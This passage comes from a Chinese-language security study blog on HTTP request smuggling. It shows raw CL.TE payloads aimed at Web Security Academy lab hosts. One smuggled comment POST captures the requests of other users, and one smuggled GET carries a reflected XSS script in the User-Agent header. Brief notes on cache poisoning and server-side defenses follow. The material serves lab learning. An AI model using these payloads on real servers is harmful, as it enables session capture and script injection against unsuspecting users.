class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">14</span>; rv:<span class="hljs-number">56</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span><span class="hljs-attribute">Cookie</span>: session=oGESUVlKzuczaZSzsazFsOCQ<span class="hljs-number">4</span>fdLetwa<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">267</span><span class="hljs-attribute">Transfer</span>-Encoding: chunked<span class="hljs-attribute">0</span><span class="hljs-attribute">POST</span> /post/comment HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: ac<span class="hljs-number">661</span>f<span class="hljs-number">531</span>e<span class="hljs-number">07</span>f<span class="hljs-number">12180</span>eb<span class="hljs-number">2</span>f<span class="hljs-number">1</span>a<span class="hljs-number">009</span>d<span class="hljs-number">0092</span>.web-security-academy.net<span class="hljs-attribute">Cookie</span>: session=oGESUVlKzuczaZSzsazFsOCQ<span class="hljs-number">4</span>fdLetwa<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">400</span><span class="hljs-attribute">csrf</span>=JDqCEvQexfPihDYr<span class="hljs-number">08</span>mrlMun<span class="hljs-number">4</span>ZJsrpX<span class="hljs-number">7</span>&amp;postId=<span class="hljs-number">5</span>&amp;name=meng&amp;email=email%<span class="hljs-number">40</span>qq.com&amp;website=&amp;comment=</code></pre></div><p>这样后面走私的请求是不完整的，等到别的用户的请求到来的时候，会直接拼接到后面，</p><h3 id="利用反射型XSS"><a href="#利用反射型XSS" class="headerlink" title="利用反射型XSS"></a>利用反射型XSS</h3><p>这里不是很明白为什么在UA出现的地方构造payload</p><p>payload如下：</p><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ac801fd21fef85b98012b3a700820000.web-security-academy.net<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>123<span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked0<span class="hljs-keyword">GET</span> <span class="hljs-string">/post?postId=5</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;#<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded</code></pre></div><h3 id="进行缓存投毒"><a href="#进行缓存投毒" class="headerlink" title="进行缓存投毒"></a>进行缓存投毒</h3><p>还不太明白，以后再深入学：</p><p><a href="https://paper.seebug.org/1048/#31-cl0get">https://paper.seebug.org/1048/#31-cl0get</a></p><h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><ul><li><p>禁用代理服务器与后端服务器之间的TCP连接重用。</p></li><li><p>使用HTTP/2协议。</p></li><li><p>前后端使用相同的服务器。</p><p>以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的TCP连接重用，会增大后端服务器的压力。使用HTTP/2在现在的网络条件下根本无法推广使用，哪怕支持HTTP/2协议的服务器也会兼容HTTP/1.1。 </p></li></ul><p>从本质上来说，HTTP请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题，个人认为最好的解决方案就是严格的实现RFC7230-7235中所规定的的标准，但这也是最难做到的。 </p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li><a href="https://paper.seebug.org/1048/#31-cl0get">https://paper.seebug.org/1048/#31-cl0get</a> </li></ul>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>HTTP请求走私</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>HTTP请求走私</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
